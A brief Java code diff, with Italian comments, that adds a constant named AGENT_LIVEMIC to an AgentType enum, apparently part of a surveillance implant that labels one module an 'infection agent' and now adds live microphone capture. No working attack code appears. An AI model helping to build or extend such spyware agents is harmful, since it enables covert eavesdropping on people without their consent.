@@ -75,6 +75,7 @@ public enum AgentType {
 	// applicazioni
 	// avviate o
 	// fermate
+	AGENT_LIVEMIC(0x1000 + 0x12),
 	/** The Constant AGENT_PDA. */
 	AGENT_PDA(0xDF7A); // Solo per PC (infection agent)
 
